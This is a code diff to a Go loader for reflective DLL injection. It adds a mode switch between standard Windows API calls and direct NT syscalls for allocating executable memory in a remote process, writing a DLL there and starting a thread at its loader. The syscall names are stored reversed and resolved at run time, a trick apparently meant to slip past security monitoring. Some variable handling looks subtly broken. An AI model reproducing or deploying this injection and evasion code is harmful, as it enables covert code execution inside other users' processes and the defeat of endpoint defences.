@@ -309,7 +309,7 @@ func GetReflectiveLoaderOffset(lpReflectiveDllBuffer uintptr) (uint32, error) {
 	return 0, nil
 }
 
-func LoadRemoteLibraryR(hProcess windows.Handle, lpBuffer uintptr, dwSize uint32) {
+func LoadRemoteLibraryR(hProcess windows.Handle, lpBuffer uintptr, dwSize uint32, call_mode string) {
 	// var (
 	// 	bSuccess                 bool                           = false
 	// 	lpRemoteLibraryBuffer    uintptr                        = 0
@@ -330,69 +330,95 @@ func LoadRemoteLibraryR(hProcess windows.Handle, lpBuffer uintptr, dwSize uint32
 	// alloc memory (RWX) in the host process for the image...
 
 	///START New comment
-	// VirtualAllocEx := windows.NewLazySystemDLL("kernel32.dll").NewProc("VirtualAllocEx")
-	// lpRemoteLibraryBuffer, _, err := VirtualAllocEx.Call(uintptr(hProcess), 0, uintptr(dwSize), windows.MEM_RESERVE|windows.MEM_COMMIT, windows.PAGE_EXECUTE_READWRITE)
-	// if !strings.Contains(err.Error(), "successfully") {
-	// 	fmt.Println("Error during VirtualAllocEx. Error : ", err)
-	// }
+	var lpRemoteLibraryBuffer uintptr
+	if call_mode == "standard" {
+		VirtualAllocEx := windows.NewLazySystemDLL("kernel32.dll").NewProc("VirtualAllocEx")
+		lpRemoteLibraryBuffer, _, err = VirtualAllocEx.Call(uintptr(hProcess), 0, uintptr(dwSize), windows.MEM_RESERVE|windows.MEM_COMMIT, windows.PAGE_EXECUTE_READWRITE)
+		if !strings.Contains(err.Error(), "successfully") {
+			fmt.Println("Error during VirtualAllocEx. Error : ", err)
+		}
+		fmt.Printf("lpRemoteLibraryBuffer : %#x\n", lpRemoteLibraryBuffer)
+	}
 	///END New comment
 
-	///////////// START ntallocatevirtualmemory
+	///////////// START NtAllocateVirtualMemory direct syscall
 	var baseA, zerob, alloctype, protect uintptr
+	dwSize2 := uintptr(dwSize)
+	if call_mode == "direct" {
 
-	dwSize2 := uintptr(dwSize) // need to this because dwSize is uint32. dwSize2 := 0x1000 would have worked too
-	protect = syscall.PAGE_EXECUTE_READWRITE
-	alloctype = 0x3000 //MEM_COMMIT | MEM_RESERVE
-	sysid := uint16(0x18)
+		dwSize2 := uintptr(dwSize) // need to this because dwSize is uint32. dwSize2 := 0x1000 would have worked too
+		protect = syscall.PAGE_EXECUTE_READWRITE
+		alloctype = 0x3000 //MEM_COMMIT | MEM_RESERVE
 
-	fmt.Printf("Base address of allocated memory: %x\n", baseA)
+		function_name := "yromeMlautriVetacollAtN" //NtAllocateVirtualMemory reversed
+		err, sysid := utils.ResolveSyscallid(function_name)
+		if err != nil {
+			fmt.Println("Error during syscall ID resolve. Err :", err)
+		}
+		fmt.Println("Syscall is resolved : ", sysid)
 
-	r1, err := utils.Syscall(
-		sysid,                             //ntallocatevirtualmemory
-		uintptr(hProcess),                 //remote process handle
-		uintptr(unsafe.Pointer(&baseA)),   //empty base address (give us something anywhere)
-		zerob,                             //0
-		uintptr(unsafe.Pointer(&dwSize2)), //pointer to size
-		alloctype,                         //commit | reserve
-		protect,                           //rwx
-	)
-	if r1 != 0 || err != nil {
-		panic(err)
+		//sysid := uint16(0x18)
+
+		fmt.Printf("Base address of allocated memory: %x\n", baseA)
+
+		r1, err := utils.Syscall(
+			sysid,                             //NtAllocateVirtualMemory
+			uintptr(hProcess),                 //remote process handle
+			uintptr(unsafe.Pointer(&baseA)),   //empty base address (give us something anywhere)
+			zerob,                             //0
+			uintptr(unsafe.Pointer(&dwSize2)), //pointer to size
+			alloctype,                         //commit | reserve
+			protect,                           //rwx
+		)
+		if r1 != 0 || err != nil {
+			panic(err)
+		}
+		lpRemoteLibraryBuffer = baseA
 	}
 
 	fmt.Printf("+++++MSP Base address of allocated memory: %x\n", baseA)
-	lpRemoteLibraryBuffer := baseA
-	///////////// END ntallocatevirtualmemory
+
+	///////////// END NtAllocateVirtualMemory direct syscall
 
 	fmt.Printf("lpRemoteLibraryBuffer : %#x\n", lpRemoteLibraryBuffer)
 
 	// write the image into the host process...
 
 	///START New comment
-	// WriteProcessMemory := windows.NewLazySystemDLL("kernel32.dll").NewProc("WriteProcessMemory")
-	// _, _, err = WriteProcessMemory.Call(uintptr(hProcess), lpRemoteLibraryBuffer, lpBuffer, uintptr(dwSize))
-	// if !strings.Contains(err.Error(), "successfully") {
-	// 	fmt.Println("Error during VirtualAllocEx. Error : ", err)
-	// }
+	if call_mode == "standard" {
+		WriteProcessMemory := windows.NewLazySystemDLL("kernel32.dll").NewProc("WriteProcessMemory")
+		_, _, err = WriteProcessMemory.Call(uintptr(hProcess), lpRemoteLibraryBuffer, lpBuffer, uintptr(dwSize))
+		if !strings.Contains(err.Error(), "successfully") {
+			fmt.Println("Error during VirtualAllocEx. Error : ", err)
+		}
+	}
 	///END New comment
 
-	///////////// START NtWriteVirtualMemory
+	///////////// START NtWriteVirtualMemory direct syscall
+	if call_mode == "direct" {
+		function_name := "yromeMlautriVetirWtN" //NtWriteVirtualMemory reversed
+		err, sysid := utils.ResolveSyscallid(function_name)
+		if err != nil {
+			fmt.Println("Error during syscall ID resolve. Err :", err)
+		}
+		fmt.Println("Syscall is resolved : ", sysid)
 
-	sysid = uint16(0x3a)
-	var BytesWritten uintptr
-	r1, err = utils.Syscall(
-		sysid,             //NtWriteVirtualMemory
-		uintptr(hProcess), //remote process handle
-		uintptr(unsafe.Pointer(lpRemoteLibraryBuffer)), //base address in the remote process
-		uintptr(unsafe.Pointer(lpBuffer)),              //pointer to our buffer where the dll is stored
-		uintptr(unsafe.Pointer(dwSize2)),               //size of buffer to write
-		uintptr(unsafe.Pointer(&BytesWritten)),         //optional but without it -> crash
-	)
-	if r1 != 0 || err != nil {
-		panic(err)
+		//sysid = uint16(0x3a)
+		var BytesWritten uintptr
+		r1, err := utils.Syscall(
+			uint16(sysid),     //NtWriteVirtualMemory
+			uintptr(hProcess), //remote process handle
+			uintptr(unsafe.Pointer(lpRemoteLibraryBuffer)), //base address in the remote process
+			uintptr(unsafe.Pointer(lpBuffer)),              //pointer to our buffer where the dll is stored
+			uintptr(unsafe.Pointer(dwSize2)),               //size of buffer to write
+			uintptr(unsafe.Pointer(&BytesWritten)),         //optional but without it -> crash
+		)
+		if r1 != 0 || err != nil {
+			panic(err)
+		}
 	}
 
-	///////////// END NtWriteVirtualMemory
+	///////////// END NtWriteVirtualMemory direct syscall
 
 	// add the offset to ReflectiveLoader() to the remote library address...
 	remoteReflectiveLoaderOffset := lpRemoteLibraryBuffer + uintptr(dwReflectiveLoaderOffset)
@@ -400,38 +426,49 @@ func LoadRemoteLibraryR(hProcess windows.Handle, lpBuffer uintptr, dwSize uint32
 	// Create a remote thread in the target process with the ReflectiveLoader function as the entry point
 
 	///START New comment
-	// fmt.Printf("remoteReflectiveLoaderOffset : %#x\n", remoteReflectiveLoaderOffset)
-	// CreateRemoteThreadEx := windows.NewLazySystemDLL("kernel32.dll").NewProc("CreateRemoteThreadEx")
-	// threadHandle, _, err := CreateRemoteThreadEx.Call(uintptr(hProcess), 0, 1024*1024, remoteReflectiveLoaderOffset, lpRemoteLibraryBuffer, 0, 0) //lpRemoteLibraryBuffer == start of the injected dll in remote process -> passed as argument
-	// if !strings.Contains(err.Error(), "successfully") {
-	// 	fmt.Println("Error during VirtualAllocEx. Error : ", err)
-	// }
+	var threadHandle uintptr
+	if call_mode == "standard" {
+		fmt.Printf("remoteReflectiveLoaderOffset : %#x\n", remoteReflectiveLoaderOffset)
+		CreateRemoteThreadEx := windows.NewLazySystemDLL("kernel32.dll").NewProc("CreateRemoteThreadEx")
+		threadHandle, _, err = CreateRemoteThreadEx.Call(uintptr(hProcess), 0, 1024*1024, remoteReflectiveLoaderOffset, lpRemoteLibraryBuffer, 0, 0) //lpRemoteLibraryBuffer == start of the injected dll in remote process -> passed as argument
+		if !strings.Contains(err.Error(), "successfully") {
+			fmt.Println("Error during VirtualAllocEx. Error : ", err)
+		}
+	}
 	///END New comment
 
-	///////////// START NtCreateThreadEx https://securityxploded.com/ntcreatethreadex.php
-	sysid = uint16(0xc2)
-	var threadHandle uintptr
-	//var hhosthread uintptr
-	r1, err = utils.Syscall(
-		sysid,                                  //NtCreateThreadEx
-		uintptr(unsafe.Pointer(&threadHandle)), //hthread
-		0x1FFFFF,                               //desiredaccess
-		0,                                      //objattributes
-		uintptr(hProcess),                      //processhandle
-		uintptr(remoteReflectiveLoaderOffset),  //lpstartaddress
-		uintptr(lpRemoteLibraryBuffer),         //lpparam
-		uintptr(0),                             //createsuspended
-		0,                                      //zerobits
-		0,                                      //sizeofstackcommit
-		0,                                      //sizeofstackreserve
-		0,                                      //lpbytesbuffer
-	)
-	syscall.WaitForSingleObject(syscall.Handle(threadHandle), 0xffffffff)
-	if r1 != 0 || err != nil {
-		panic(err)
+	///////////// START NtCreateThreadEx direct syscall https://securityxploded.com/ntcreatethreadex.php
+	if call_mode == "direct" {
+		function_name := "xEdaerhTetaerCtN" //NtCreateThreadEx reversed
+		err, sysid := utils.ResolveSyscallid(function_name)
+		if err != nil {
+			fmt.Println("Error during syscall ID resolve. Err :", err)
+		}
+		fmt.Println("Syscall is resolved : ", sysid)
+		//sysid = uint16(0xc2)
+
+		//var hhosthread uintptr
+		r1, err := utils.Syscall(
+			sysid,                                  //NtCreateThreadEx
+			uintptr(unsafe.Pointer(&threadHandle)), //hthread
+			0x1FFFFF,                               //desiredaccess
+			0,                                      //objattributes
+			uintptr(hProcess),                      //processhandle
+			uintptr(remoteReflectiveLoaderOffset),  //lpstartaddress
+			uintptr(lpRemoteLibraryBuffer),         //lpparam
+			uintptr(0),                             //createsuspended
+			0,                                      //zerobits
+			0,                                      //sizeofstackcommit
+			0,                                      //sizeofstackreserve
+			0,                                      //lpbytesbuffer
+		)
+		//syscall.WaitForSingleObject(syscall.Handle(threadHandle), 0xffffffff)
+		if r1 != 0 || err != nil {
+			panic(err)
+		}
 	}
 
-	///////////// END NtCreateThreadEx
+	///////////// END NtCreateThreadEx direct syscall
 
 	if threadHandle == 0 {
 		fmt.Println("Failed to create remote thread:", err)
